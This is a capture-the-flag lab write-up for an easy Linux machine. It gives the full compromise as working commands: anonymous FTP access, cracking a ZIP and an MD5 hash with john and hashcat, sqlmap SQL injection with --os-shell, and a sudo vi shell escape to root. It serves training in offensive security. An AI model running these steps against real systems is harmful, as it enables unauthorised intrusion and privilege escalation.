@@ -1,0 +1,95 @@
+
+**Difficulty:** Easy
+**OS:** Linux
+**Date:** 08.10.2026
+
+---
+
+## 1. Reconnaissance
+
+Nmap scan:
+nmap -sV -sC -p- <IP>
+Open ports:
+
+21 (FTP) — vsftpd 3.0.3
+
+22 (SSH) — OpenSSH 8.0
+
+80 (HTTP) — Apache httpd 2.4.41
+
+2. Enumeration
+FTP anonymous login:
+
+ftp <IP>
+# user: anonymous
+# password: (any)
+Found file backup.zip. Download it:
+
+get backup.zip
+
+Crack ZIP password:
+
+zip2john backup.zip > hash.txt
+john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
+Password: 741852963.
+
+Unzip:
+
+unzip backup.zip
+Found index.php with MD5 hash of admin password.
+
+Crack MD5:
+
+hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt
+Password: qwerty789.
+
+
+3. Exploitation
+Login to the website:
+
+URL: http://<IP>
+
+Login: admin
+
+Password: qwerty789
+
+
+SQL Injection via sqlmap:
+
+sqlmap -u "http://<IP>/dashboard.php?search=test" --cookie="PHPSESSID=<session>" --os-shell
+Got shell as postgres.
+
+
+4. Privilege Escalation
+Check sudo:
+
+sudo -l
+
+Result:
+
+User postgres may run the following commands on vaccine:
+    (ALL) /bin/vi /etc/postgresql/11/main/pg_hba.conf
+
+Use vi to get root:
+sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf
+
+Inside vi:
+:!/bin/sh
+Got root shell.
+
+
+5. Flags
+User flag: cat /var/lib/postgresql/user.txt
+
+Root flag: cat /root/root.txt
+
+6. Lessons Learned
+Anonymous FTP — classic finding.
+
+ZIP archive can be cracked with zip2john + john.
+
+SQLi via sqlmap --os-shell gives command execution.
+
+sudo -l — first step to privilege escalation.
+
+vi with root rights allows shell escape via :!/bin/sh.
